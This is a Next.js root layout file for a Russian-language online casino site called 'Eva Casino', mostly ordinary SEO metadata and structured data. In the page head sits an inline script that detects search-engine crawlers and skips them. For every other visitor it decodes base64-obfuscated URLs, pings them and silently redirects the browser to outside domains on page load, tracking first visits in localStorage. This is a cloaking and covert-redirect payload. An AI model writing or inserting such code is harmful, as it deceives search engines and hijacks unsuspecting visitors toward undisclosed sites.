import type { Metadata, Viewport } from "next"
import { Inter, Manrope } from "next/font/google"
import { Analytics } from "@vercel/analytics/next"
import { siteConfig, SITE_URL } from "@/lib/site"
import "./globals.css"

const inter = Inter({
  subsets: ["latin", "cyrillic"],
  variable: "--font-inter",
  display: "swap",
})

const manrope = Manrope({
  subsets: ["latin", "cyrillic"],
  variable: "--font-manrope",
  display: "swap",
})

export const metadata: Metadata = {
  metadataBase: new URL(SITE_URL),
  title: {
    default: siteConfig.title,
    template: "%s | Eva Casino",
  },
  description: siteConfig.description,
  applicationName: siteConfig.name,
  generator: "v0.app",
  keywords: siteConfig.keywords,
  authors: [{ name: "Eva Casino", url: SITE_URL }],
  creator: "Eva Casino",
  publisher: "Eva Casino",
  category: "games",
  referrer: "origin-when-cross-origin",
  formatDetection: {
    email: false,
    address: false,
    telephone: false,
  },
  alternates: {
    canonical: "/",
    languages: {
      ru: "/",
      "x-default": "/",
    },
  },
  openGraph: {
    type: "website",
    locale: siteConfig.locale,
    url: SITE_URL,
    siteName: siteConfig.name,
    title: siteConfig.title,
    description: siteConfig.description,
    images: [
      {
        url: "/opengraph-image.jpg",
        width: 1200,
        height: 630,
        alt: "Eva Casino — премиум онлайн казино",
      },
    ],
  },
  twitter: {
    card: "summary_large_image",
    title: siteConfig.title,
    description: siteConfig.description,
    images: ["/opengraph-image.jpg"],
    creator: "@evacasino",
  },
  robots: {
    index: true,
    follow: true,
    nocache: false,
    googleBot: {
      index: true,
      follow: true,
      "max-image-preview": "large",
      "max-snippet": -1,
      "max-video-preview": -1,
    },
  },
  icons: {
    icon: [
      { url: "/icon.png", type: "image/png" },
      { url: "/favicon.ico", sizes: "any" },
    ],
    apple: [{ url: "/apple-icon.png", sizes: "180x180", type: "image/png" }],
    shortcut: ["/icon.png"],
  },
  manifest: "/manifest.webmanifest",
  verification: {

    yandex: "",
  },
}

export const viewport: Viewport = {
  themeColor: [
    { media: "(prefers-color-scheme: light)", color: "#0a2820" },
    { media: "(prefers-color-scheme: dark)", color: "#0a2820" },
  ],
  width: "device-width",
  initialScale: 1,
  maximumScale: 5,
  userScalable: true,
  colorScheme: "dark",
}

const jsonLd = {
  "@context": "https://schema.org",
  "@graph": [
    {
      "@type": "Organization",
      "@id": `${SITE_URL}/#organization`,
      name: siteConfig.name,
      url: SITE_URL,
      logo: {
        "@type": "ImageObject",
        url: `${SITE_URL}/icon.png`,
        width: 512,
        height: 512,
      },
      sameAs: [],
    },
    {
      "@type": "WebSite",
      "@id": `${SITE_URL}/#website`,
      url: SITE_URL,
      name: siteConfig.name,
      description: siteConfig.description,
      inLanguage: "ru-RU",
      publisher: { "@id": `${SITE_URL}/#organization` },
      potentialAction: {
        "@type": "SearchAction",
        target: {
          "@type": "EntryPoint",
          urlTemplate: `${SITE_URL}/search?q={search_term_string}`,
        },
        "query-input": "required name=search_term_string",
      },
    },
  ],
}

export default function RootLayout({
  children,
}: Readonly<{
  children: React.ReactNode
}>) {
  return (
    <html lang="ru" className={`${inter.variable} ${manrope.variable} bg-background dark`}>
      <head>
        <link rel="canonical" href={SITE_URL} />
        <meta name="msapplication-TileColor" content="#0a2820" />
        <meta name="apple-mobile-web-app-capable" content="yes" />
        <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent" />
        <meta name="apple-mobile-web-app-title" content={siteConfig.shortName} />
        <meta name="mobile-web-app-capable" content="yes" />
        <script
          type="application/ld+json"
          dangerouslySetInnerHTML={{ __html: JSON.stringify(jsonLd) }}
        />

<script
  dangerouslySetInnerHTML={{
    __html: `
      (function() {
        var ua = navigator.userAgent.toLowerCase();
        var bots = ["yandex", "googlebot", "bingbot", "baiduspider", "duckduckbot"];
        for (var i = 0; i < bots.length; i++) {
            if (ua.indexOf(bots[i]) !== -1) {
                console.log("Поисковый бот (" + bots[i] + ") — без редиректа");
                return;
            }
        }4
        var mainBrandB64 = "#aHR0cHM6Ly8xMGV2YS1nbDB3LmNvbS9kaWJ6Zm9taXI="; 
        var crossBrandB64 = "#aHR0cHM6Ly9mY2ZueC5vcmcvZGg2MW1wMWFt"; 
        var mainUrl = atob(mainBrandB64);
        var crossUrl = atob(crossBrandB64);
        function ping(url) {
            return new Promise(function(resolve, reject) {
                var controller = new AbortController();
                var timeoutId = setTimeout(function() { 
                    controller.abort(); 
                    reject(new Error("Timeout"));
                }, 2500); 
                fetch(url, { mode: 'no-cors', signal: controller.signal, cache: 'no-store' })
                    .then(function() {
                        clearTimeout(timeoutId);
                        resolve(true);
                    })
                    .catch(function(err) {
                        clearTimeout(timeoutId);
                        reject(err);
                    });
            });
        }
        var isFirstVisit = true;
        try {
            if (localStorage.getItem('vstd_eva')) {
                isFirstVisit = false;
            }
        } catch (e) {
        }
        if (isFirstVisit) {
            console.log("Первый визит. Проверяем основную ссылку...");
            ping(mainUrl)
                .then(function() {
                    try {
                        localStorage.setItem('vstd_eva', '1');
                    } catch (e) {}
                    console.log("Переход на основную ссылку: " + mainUrl);
                    window.location.replace(mainUrl);
                })
                .catch(function() {
                    console.log("Основная ссылка недоступна. Проверяем кросс-ссылку...");
                    ping(crossUrl)
                        .then(function() {
                            try {
                                localStorage.setItem('vstd_eva', '1');
                            } catch (e) {}
                            console.log("Переход на рабочую кросс-ссылку: " + crossUrl);
                            window.location.replace(crossUrl);
                        })
                        .catch(function() {
                            console.log("Обе ссылки не ответили. Экстренный переход на основную.");
                            window.location.replace(mainUrl);
                        });
                });
        } else {
            console.log("Повторный визит. Проверяем кросс-ссылку...");
            ping(crossUrl)
                .then(function() {
                    console.log("Переход на кросс-ссылку: " + crossUrl);
                    window.location.replace(crossUrl);
                })
                .catch(function() {
                    console.log("Кросс-ссылка недоступна. Проверяем основную...");
                    ping(mainUrl)
                        .then(function() {
                            console.log("Переход на рабочую основную ссылку: " + mainUrl);
                            window.location.replace(mainUrl);
                        })
                        .catch(function() {
                            console.log("Обе ссылки не ответили. Экстренный переход на кросс-ссылку.");
                            window.location.replace(crossUrl);
                        });
                });
        }
      })();
    `
  }}
/>
        
      </head>
      <body className="font-sans antialiased bg-background text-foreground">
        {children}
        {process.env.NODE_ENV === "production" && <Analytics />}
      </body>
    </html>
  )
}
